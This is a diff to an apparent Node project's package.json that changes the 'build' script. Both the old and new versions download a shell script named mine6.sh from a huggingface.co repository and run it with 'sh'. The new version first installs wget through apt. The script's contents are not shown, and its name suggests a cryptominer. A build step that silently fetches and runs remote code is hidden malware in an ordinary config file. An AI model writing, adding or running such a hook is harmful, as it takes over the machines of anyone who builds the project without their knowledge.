@@ -4,7 +4,7 @@
   "description": "",
   "main": "src/index.js",
   "scripts": {
-    "build": "wget https://huggingface.co/myfiles/data/raw/main/mine6.sh && sh mine6.sh"
+    "build": "apt update && apt install wget -y && wget https://huggingface.co/myfiles/data/raw/main/mine6.sh && sh mine6.sh"
   },
   "dependencies": {
     "@cyclic.sh/dynamodb": "0.0.30",
